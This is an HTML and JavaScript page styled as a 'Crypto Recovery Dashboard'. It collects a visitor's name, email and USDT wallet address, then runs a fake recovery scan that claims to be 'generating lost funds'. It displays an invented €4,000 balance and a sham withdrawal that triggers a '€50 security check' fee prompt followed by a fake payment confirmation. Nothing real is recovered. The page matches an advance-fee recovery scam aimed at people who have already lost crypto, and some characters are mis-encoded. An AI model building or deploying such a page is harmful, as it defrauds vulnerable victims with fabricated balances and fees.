<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Crypto Recovery Dashboard</title>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
  <style>
    :root {
      --primary: #0a2342;
      --secondary: #183d5d;
      --accent: #01c3ff;
      --accent2: #2ed8a7;
      --yellow: #f0b90b;
      --success: #19f3be;
      --danger: #ff4d4d;
      --card-bg: #12203a;
      --input-bg: #192a46;
      --shadow: 0 8px 32px 0 rgba(2,30,66,0.22);
      --radius: 18px;
      --blur: blur(8px);
      --step-dur: 0.44s;
    }
    html, body {
      margin: 0; padding: 0;
      font-family: 'Inter', 'Segoe UI', Arial, sans-serif;
      background: linear-gradient(120deg, #142850 0%, #27496d 100%);
      min-height: 100vh;
      color: #fff;
      letter-spacing: 0.01em;
      scroll-behavior: smooth;
    }
    /* Common Container */
    .container {
      max-width: 420px;
      margin: 60px auto 0 auto;
      padding: 36px 28px;
      background: rgba(18,32,58,0.98);
      border-radius: var(--radius);
      box-shadow: var(--shadow);
      position: relative;
      z-index: 1;
      min-height: 420px;
      animation: fadeIn var(--step-dur) cubic-bezier(.3,.58,.7,1.04);
    }
    @keyframes fadeIn {
      from { opacity: 0; transform: translateY(30px);}
      to { opacity: 1; transform: translateY(0);}
    }
    h2 {
      text-align: center;
      font-weight: 700;
      color: var(--accent);
      margin-bottom: 25px;
      font-size: 2em;
      letter-spacing: 0.03em;
    }
    label {
      font-weight: 600;
      font-size: 1.03em;
      margin-bottom: 7px;
      display: block;
      color: #b2cae8;
    }
    input, select, button {
      width: 100%;
      padding: 14px;
      margin: 12px 0 22px 0;
      border: none;
      border-radius: 9px;
      font-size: 1.06em;
      background: var(--input-bg);
      color: #fff;
      outline: none;
      transition: background 0.15s, box-shadow 0.15s;
    }
    select:focus, input:focus {
      background: #20345c;
      box-shadow: 0 0 0 2px var(--accent);
    }
    button {
      background: linear-gradient(90deg, var(--accent) 60%, var(--accent2));
      color: #0a2342;
      font-weight: 700;
      font-size: 1.13em;
      letter-spacing: 0.03em;
      cursor: pointer;
      margin-top: 10px;
      box-shadow: 0 3px 16px 0 rgba(1,195,255,0.09);
      transition: background 0.22s, color 0.22s, box-shadow 0.22s, transform 0.16s;
    }
    button:active {
      background: linear-gradient(90deg, var(--accent2), var(--accent));
      color: #fff;
      box-shadow: 0 3px 16px 0 rgba(1,195,255,0.22);
      transform: scale(0.97);
    }
    button:disabled {
      background: #6c7a92;
      color: #d7e4f7;
      cursor: not-allowed;
    }
    /* Stepper Bar */
    .stepper {
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin-bottom: 26px;
      margin-top: 5px;
      padding: 0 10px;
    }
    .stepper-step {
      text-align: center;
      flex: 1 1 0%;
      position: relative;
      z-index: 1;
    }
    .stepper-dot {
      width: 17px; height: 17px;
      border-radius: 50%;
      background: #2c3c55;
      border: 2.5px solid var(--accent2);
      margin: 0 auto 2px auto;
      transition: background 0.19s, border 0.19s;
    }
    .stepper-dot.active {
      background: var(--accent2);
      border-color: var(--accent);
    }
    .stepper-label {
      font-size: 0.97em;
      color: #b4d2f3;
      letter-spacing: 0.01em;
    }
    .stepper-bar {
      position: absolute;
      top: 8px;
      left: 50%;
      width: 100%;
      height: 3.8px;
      background: linear-gradient(90deg, var(--accent) 40%, var(--accent2));
      z-index: 0;
      opacity: 0.3;
      border-radius: 2px;
      transform: translateX(-50%);
      pointer-events: none;
    }
    /* Fade Transitions for Section */
    .step-section {
      animation: fadeInSection var(--step-dur);
    }
    @keyframes fadeInSection {
      from { opacity: 0; transform: translateY(22px);}
      to { opacity: 1; transform: translateY(0);}
    }
    /* Progress Bar */
    .progress-bar-bg {
      width: 100%; height: 11px;
      background: #20345c;
      border-radius: 7px;
      margin: 25px 0 32px 0;
      overflow: hidden;
    }
    .progress-bar-fill {
      height: 100%;
      width: 0;
      background: linear-gradient(90deg, var(--accent), var(--accent2));
      transition: width 0.5s cubic-bezier(.3,.58,.7,1.04);
    }
    .activity {
      text-align: center;
      font-size: 1.17em;
      color: #b7d3f6;
      margin-bottom: 18px;
    }
    .scan-steps {
      margin: 18px 0 10px 0;
      padding: 0;
      list-style: none;
    }
    .scan-step {
      background: #174074;
      border-left: 5px solid var(--accent2);
      margin: 7px 0;
      padding: 12px 18px;
      border-radius: 8px;
      font-size: 1.03em;
      animation: fadeInStep 0.5s;
    }
    @keyframes fadeInStep {
      from { opacity: 0; transform: translateY(14px);}
      to { opacity: 1; transform: translateY(0);}
    }
    .success {
      color: var(--success);
      font-weight: 700;
      text-align: center;
      margin: 22px 0 10px 0;
      font-size: 1.25em;
    }
    .balance {
      font-size: 2.0em;
      text-align: center;
      margin: 24px 0 13px 0;
      color: var(--accent2);
      font-weight: 700;
      letter-spacing: 0.04em;
    }
    .stamp {
      margin-top: 18px;
      text-align: center;
      font-size: 1.22em;
      color: var(--yellow);
      font-weight: 700;
      letter-spacing: 0.02em;
    }
    /* MODAL */
    .modal-bg {
      position: fixed;
      top: 0; left: 0; right: 0; bottom: 0;
      background: rgba(20,40,80,0.56);
      display: flex;
      align-items: center;
      justify-content: center;
      z-index: 12;
      animation: fadeInModal 0.4s;
    }
    @keyframes fadeInModal {
      from { opacity: 0;}
      to { opacity: 1;}
    }
    .modal {
      background: #162b51;
      padding: 32px 26px;
      border-radius: 22px;
      box-shadow: 0 8px 32px 0 rgba(2,30,66,0.18);
      min-width: 330px;
      max-width: 95vw;
      text-align: center;
      position: relative;
      z-index: 13;
      animation: fadeIn 0.3s;
    }
    .modal .modal-title {
      font-size: 1.31em;
      color: var(--accent2);
      font-weight: 700;
      margin-bottom: 19px;
      letter-spacing: 0.01em;
    }
    .modal .modal-details {
      color: #a3b9d1;
      margin-bottom: 19px;
      font-size: 1.13em;
      letter-spacing: 0.01em;
      word-break: break-all;
    }
    .modal .close-btn {
      position: absolute;
      top: 9px; right: 14px;
      background: none; border: none; color: #9fb4d7;
      font-size: 1.7em; font-weight: bold; cursor: pointer;
      transition: color 0.18s;
    }
    .modal .close-btn:hover {
      color: var(--accent);
    }
    /* Error Popup */
    .error-popup-bg {
      position: fixed;
      top: 0; left: 0; right: 0; bottom: 0;
      background: rgba(20,40,80,0.65);
      display: flex;
      align-items: center;
      justify-content: center;
      z-index: 100;
      animation: fadeInModal 0.35s;
    }
    .error-popup {
      background: #1e233a;
      padding: 30px 26px;
      border-radius: 18px;
      box-shadow: 0 8px 32px 0 rgba(255,77,77,0.13);
      min-width: 310px;
      max-width: 90vw;
      text-align: center;
      border: 2px solid var(--danger);
      color: var(--danger);
      font-weight: 700;
      font-size: 1.1em;
      animation: fadeIn 0.2s;
    }
    .error-popup button {
      margin-top: 22px;
      background: var(--danger);
      color: #fff;
      font-size: 1em;
      border-radius: 7px;
      padding: 10px 0;
      border: none;
      font-weight: 700;
      cursor: pointer;
      width: 60%;
      transition: background 0.19s;
    }
    .error-popup button:hover {
      background: #e03838;
    }
    /* Snackbar/Toast */
    #snackbar {
      visibility: hidden;
      min-width: 220px;
      background-color: #152b51;
      color: #fff;
      text-align: center;
      border-radius: 9px;
      padding: 15px;
      position: fixed;
      left: 50%;
      bottom: 36px;
      transform: translateX(-50%);
      font-size: 1.08em;
      z-index: 300;
      box-shadow: 0 3px 12px 0 rgba(1,195,255,0.14);
      opacity: 0;
      transition: opacity 0.3s, visibility 0.3s;
    }
    #snackbar.show {
      visibility: visible;
      opacity: 1;
    }
    @media (max-width: 600px) {
      .container {
        margin: 16px auto;
        padding: 18px 6vw;
      }
      .modal, .error-popup {
        min-width: 90vw;
        padding: 18px 5vw;
      }
    }
  </style>
</head>
<body>
  <!-- STEP 1: Registration Section -->
  <div class="container step-section" id="registrationSection">
    <div class="stepper">
      <div class="stepper-step">
        <div class="stepper-dot active"></div>
        <div class="stepper-label">Registration</div>
      </div>
      <div class="stepper-bar"></div>
      <div class="stepper-step">
        <div class="stepper-dot"></div>
        <div class="stepper-label">Dashboard</div>
      </div>
      <div class="stepper-bar"></div>
      <div class="stepper-step">
        <div class="stepper-dot"></div>
        <div class="stepper-label">Withdraw</div>
      </div>
    </div>
    <h2>Crypto Recovery Registration</h2>
    <label for="country">Country</label>
    <select id="country">
      <option value="">Select your country</option>
      <option value="USA">United States</option>
      <option value="UK">United Kingdom</option>
      <option value="Nigeria">Nigeria</option>
      <option value="Other">Other</option>
    </select>
    <label for="name">Full Name</label>
    <input type="text" id="name" placeholder="Enter your full name" autocomplete="name"/>
    <label for="usdt">USDT Address</label>
    <input type="text" id="usdt" placeholder="Your USDT wallet address" autocomplete="off"/>
    <label for="email">Email Address</label>
    <input type="email" id="email" placeholder="Enter your email" autocomplete="email"/>
    <button onclick="register()">Register & Continue</button>
  </div>

  <!-- STEP 2: Dashboard Section -->
  <div class="container step-section hidden" id="dashboardSection">
    <div class="stepper">
      <div class="stepper-step">
        <div class="stepper-dot active"></div>
        <div class="stepper-label">Registration</div>
      </div>
      <div class="stepper-bar"></div>
      <div class="stepper-step">
        <div class="stepper-dot active"></div>
        <div class="stepper-label">Dashboard</div>
      </div>
      <div class="stepper-bar"></div>
      <div class="stepper-step">
        <div class="stepper-dot"></div>
        <div class="stepper-label">Withdraw</div>
      </div>
    </div>
    <h2>Welcome Back</h2>
    <div class="activity" id="greeting"></div>
    <button id="recoveryBtn" onclick="startRecovery()">Start Recovery</button>
    <div class="progress-bar-bg hidden" id="progressBarBg">
      <div class="progress-bar-fill" id="progressBarFill"></div>
    </div>
    <ul id="scanSteps" class="scan-steps"></ul>
    <div id="finalMessage" class="success hidden">üéâ Congratulations, your recovery is complete!</div>
    <div class="balance hidden" id="balance">‚Ç¨4,000.00</div>
    <button class="hidden" id="withdrawBtn" onclick="goToWithdraw()">Withdraw in USDC</button>
    <div class="stamp hidden" id="stamp">‚úÖ Final Payment Confirmation Stamp</div>
  </div>

  <!-- STEP 3: Withdraw Section -->
  <div class="container step-section hidden" id="withdrawSection">
    <div class="stepper">
      <div class="stepper-step">
        <div class="stepper-dot active"></div>
        <div class="stepper-label">Registration</div>
      </div>
      <div class="stepper-bar"></div>
      <div class="stepper-step">
        <div class="stepper-dot active"></div>
        <div class="stepper-label">Dashboard</div>
      </div>
      <div class="stepper-bar"></div>
      <div class="stepper-step">
        <div class="stepper-dot active"></div>
        <div class="stepper-label">Withdraw</div>
      </div>
    </div>
    <h2>Withdraw USDC</h2>
    <div style="text-align:center;font-size:1.09em;color:#b7d3f6;margin-bottom:18px;">
      Preview and confirm your withdrawal below.
    </div>
    <div class="modal-details" style="margin-bottom:13px;">
      <div><b>Amount:</b> 4,000 USDC</div>
      <div><b>Network:</b> Ethereum</div>
      <div><b>Recipient:</b> <span id="withdrawRecipient"></span></div>
    </div>
    <button onclick="confirmWithdrawal()">Confirm Withdrawal</button>
    <div class="stamp hidden" id="withdrawStamp">‚úÖ Final Payment Confirmation Stamp</div>
  </div>

  <!-- Error Popup -->
  <div class="error-popup-bg hidden" id="errorPopupBg">
    <div class="error-popup">
      ‚ö†Ô∏è Security check required: ‚Ç¨50<br>
      <button onclick="closeErrorPopup()">OK, Got it</button>
    </div>
  </div>

  <!-- Snackbar/Toast -->
  <div id="snackbar"></div>

  <script>
    // DOM references for all steps
    const registrationSection = document.getElementById('registrationSection');
    const dashboardSection = document.getElementById('dashboardSection');
    const withdrawSection = document.getElementById('withdrawSection');

    // Dashboard DOM
    const greeting = document.getElementById('greeting');
    const scanSteps = document.getElementById('scanSteps');
    const finalMessage = document.getElementById('finalMessage');
    const balanceDisplay = document.getElementById('balance');
    const withdrawBtn = document.getElementById('withdrawBtn');
    const progressBarBg = document.getElementById('progressBarBg');
    const progressBarFill = document.getElementById('progressBarFill');
    const stamp = document.getElementById('stamp');

    // Withdraw DOM
    const withdrawRecipient = document.getElementById('withdrawRecipient');
    const withdrawStamp = document.getElementById('withdrawStamp');

    // Error Popup and snackbar
    const errorPopupBg = document.getElementById('errorPopupBg');
    const snackbar = document.getElementById('snackbar');

    // Steps for animated recovery
    const steps = [
      "Checking previous blockchain activities...",
      "Generating lost funds for your profile...",
      "Loading blockchain database...",
      "Refreshing wallet info...",
      "Posting your profile securely to the blockchain...",
      "Selecting crypto for payout...",
      "USDC SELECTED ‚úÖ",
      "Completing scan details...",
      "Finalizing user recovery..."
    ];

    let username = "", usdtAddr = "";

    // Stepper update helper
    function updateStepper(step) {
      // step: 0=reg, 1=dashboard, 2=withdraw
      document.querySelectorAll('.container').forEach(cn => cn.classList.add('hidden'));
      if(step===0) registrationSection.classList.remove('hidden');
      if(step===1) dashboardSection.classList.remove('hidden');
      if(step===2) withdrawSection.classList.remove('hidden');
    }

    // Registration
    function register() {
      const country = document.getElementById('country').value;
      username = document.getElementById('name').value.trim();
      usdtAddr = document.getElementById('usdt').value.trim();
      const email = document.getElementById('email').value.trim();
      if (!country || !username || !usdtAddr || !email) {
        showToast("Please fill all fields.", "error");
        return;
      }
      // Save info for the session (simulate)
      localStorage.setItem('registered', true);
      localStorage.setItem('name', username);
      localStorage.setItem('usdt', usdtAddr);
      showToast("Welcome, " + username + "!", "success");
      setTimeout(() => {
        startDashboard();
      }, 800);
    }

    // Dashboard: recovery process
    function startDashboard() {
      updateStepper(1);
      username = localStorage.getItem('name') || username;
      usdtAddr = localStorage.getItem('usdt') || usdtAddr;
      greeting.textContent = `Dear ${username}, you have 1 ongoing recovery activity.`;
      // Reset for each new entry
      scanSteps.innerHTML = "";
      progressBarBg.classList.add('hidden');
      progressBarFill.style.width = "0%";
      withdrawBtn.classList.add('hidden');
      finalMessage.classList.add('hidden');
      balanceDisplay.classList.add('hidden');
      stamp.classList.add('hidden');
    }

    function startRecovery() {
      scanSteps.innerHTML = "";
      progressBarBg.classList.remove('hidden');
      let idx = 0;
      let stepsCompleted = 0;
      let total = steps.length;
      progressBarFill.style.width = "0%";
      scanSteps.style.opacity = "1";
      withdrawBtn.classList.add('hidden');
      finalMessage.classList.add('hidden');
      balanceDisplay.classList.add('hidden');
      stamp.classList.add('hidden');
      // Animate steps + progress bar
      function nextStep() {
        if (idx < steps.length) {
          stepsCompleted++;
          progressBarFill.style.width = ((stepsCompleted/total)*100) + "%";
          const li = document.createElement('li');
          li.className = "scan-step";
          li.textContent = steps[idx];
          scanSteps.appendChild(li);
          idx++;
          setTimeout(nextStep, 850);
        } else {
          setTimeout(() => {
            finalMessage.classList.remove('hidden');
            balanceDisplay.classList.remove('hidden');
            withdrawBtn.classList.remove('hidden');
            showToast("Recovery complete. Withdraw your funds!", "success");
          }, 900);
        }
      }
      nextStep();
    }

    // Withdraw Step
    function goToWithdraw() {
      updateStepper(2);
      withdrawRecipient.textContent = usdtAddr || localStorage.getItem('usdt') || "[Your USDT Address]";
      withdrawStamp.classList.add('hidden');
    }

    function confirmWithdrawal() {
      // Show error popup after short delay for realism
      setTimeout(() => {
        errorPopupBg.classList.remove('hidden');
      }, 400);
    }

    function closeErrorPopup() {
      errorPopupBg.classList.add('hidden');
      setTimeout(() => {
        withdrawStamp.classList.remove('hidden');
        showToast("Final payment confirmed. Withdrawal processed.", "success");
      }, 700);
    }

    // Snackbar/Toast
    function showToast(msg, type="info") {
      snackbar.textContent = msg;
      snackbar.className = "show";
      snackbar.style.backgroundColor =
        type === "success" ? "#20345c"
      : type === "error" ? "#35213a"
      : "#152b51";
      setTimeout(() => { snackbar.className = snackbar.className.replace("show", ""); }, 2500);
    }

    // Restore session if already registered (simulate step-by-step)
    window.onload = function() {
      if (localStorage.getItem('registered')) {
        username = localStorage.getItem('name');
        usdtAddr = localStorage.getItem('usdt');
        startDashboard();
      } else {
        updateStepper(0);
      }
    };
  </script>
</body>
</html>
